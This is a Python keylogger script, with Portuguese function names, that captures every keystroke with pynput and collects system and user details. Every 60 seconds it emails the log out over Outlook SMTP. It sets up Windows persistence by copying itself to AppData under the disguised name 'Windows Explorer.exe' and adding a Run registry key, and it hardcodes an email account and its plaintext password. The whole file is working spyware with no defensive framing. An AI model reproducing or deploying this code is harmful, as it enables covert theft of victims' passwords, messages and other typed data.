from pynput.keyboard import  Listener
import platform
import datetime
import getpass
import sys
import os
import threading
import shutil
import subprocess
from email.mime.text import MIMEText



class Report:
    def __init__(self, email:str, password:str) -> None:
        self.log = ''
        self.sys_info = self.get_sys()
        self.interval = 60
        self.email = email
        self.password = password
        
        
    def get_sys(self) -> str:
        uname = platform.uname()
        self.os = uname[0] + ' ' + uname[2] + "" + uname[3]
        self.computer = uname[1]
        self.user = getpass.getuser()
        now = datetime.datetime.now()
        return f'os: {self.os} - computer: {self.computer} - user: {self.user} -  time: {now} \n'


    def append(self, string):
        self.log = self.log + string
        

    def mandar(self):
        mess = MIMEText(self.log)
        mess['Subject'] = f'Report {self.sys_info}'
        mess['From'] = self.email
        mess['To'] = self.email
        
        import smtplib
        
        if len(self.log) == 0:
            print(self.log)
            return
        else:
            print(self.log)
        with smtplib.SMTP('smtp-mail.outlook.com', 587) as server:
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, mess.as_string())
            
    def on_press(self, key):
        try:
            self.append(f"{key.char} ")
        except AttributeError:
            self.append(f"{key} ")


    def start(self):
        listener = Listener(on_press=self.on_press)
        with listener:
            self.report()
            listener.join()


    def ficar_malado_persistencia(self):
        if sys.platform.startswith('win'):
            self.persistance_win()
        elif sys.platform.startswith('linux'):
            self.log('Linux esquece pai!')
        

    def persistance_win(self):
        location = os.environ['appdata'] + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            self.log = f'Started LOGGING {self.sys_info}'
            self.mandar()
            shutil.copyfile(sys.executable, location)
            subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + location + '"', shell=True)
    
    def report(self):
        self.mandar()
        timer = threading.Timer(self.interval, self.report)
        self.log = ''
        timer.start()
        
def main():
    report = Report(email='romfernandino@outlook.com',password='dulce2014')
    report.ficar_malado_persistencia()
    report.start()

main()


